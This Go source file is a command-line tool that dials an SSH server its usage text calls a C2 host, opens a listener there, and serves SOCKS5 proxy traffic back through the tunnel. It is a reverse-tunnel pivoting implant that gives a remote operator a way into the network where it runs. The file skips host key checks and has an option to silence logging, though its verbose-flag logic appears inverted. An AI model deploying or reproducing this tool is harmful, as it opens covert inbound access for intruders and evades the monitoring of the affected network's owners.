package main

import (
	
	"net"
	"os"
	"time"
	"log"
	"io/ioutil"
	"fmt"

	"golang.org/x/crypto/ssh"
	"github.com/armon/go-socks5"	
)

func main(){

    argsWithoutProg := os.Args[1:]

    if !( (len(argsWithoutProg) == 4) || (len(argsWithoutProg) == 5) ){
    	fmt.Println("Incorrect number of params: butron <key.pem> <SSHuser> <C2IP:Port> <IPtoListen:Port> <OptionalParamLog>")
    	return
    }

    pathkeypem := argsWithoutProg[0]	// "/path/to/key.pem"
    sshuser := argsWithoutProg[1]		// "ubuntu,anonymous,root..."
    sshsocket := argsWithoutProg[2]		// "<IP>:<Port>"
    listensocket := argsWithoutProg[3]  // "<IP>:<Port>"

    var verbose string
    if len(argsWithoutProg) == 4 {	    //Any string will be ok if logging desired
    	verbose = "yes"
    }

    RevSshSocks5(pathkeypem,sshuser,sshsocket,listensocket,verbose)

}


func RevSshSocks5(pathkeypem string,sshuser string,sshsocket string,listensocket string,verbose string) {

    // Retrieve key from file
    content, errFile := ioutil.ReadFile(pathkeypem)
    if errFile != nil {
    	fmt.Println("Load SSH File Key error"+errFile.Error())
    	return
    }

	auth, err := loadPrivateKey(string(content))
	if err != nil {
    	fmt.Println("Load Key String error"+err.Error())
    	return
	}

	config := &ssh.ClientConfig{
		User: sshuser,
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", sshsocket, config)
	if err != nil {
    	fmt.Println("Error: error dialing remote host:"+err.Error())
    	return
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", listensocket)
	if err != nil {
    	fmt.Println("Error: error listening on remote host:"+err.Error())
    	return
	}

	listenSSHSocks5(sshConn,l,verbose)

	return
}


func listenSSHSocks5(sshconn *ssh.Client,l net.Listener,verbose string){

	defer sshconn.Close()

	conf := &socks5.Config{}

	//Make sure SOCKS5 don't log stuff (OPTIONAL)
	if (verbose == "yes"){
		logger := log.New(ioutil.Discard, "", log.LstdFlags)
		conf = &socks5.Config{Logger:logger}
	}

	
	server, err := socks5.New(conf)
	if err != nil {
  		return
	}

	// Start accepting shell connections
	for {
		
		conn, err := l.Accept()
		if err != nil {
			return
		}

		go server.ServeConn(conn)

	}
}

func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {


	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
	if signerErr != nil {
		return nil, signerErr
	}
	return ssh.PublicKeys(signer), nil
}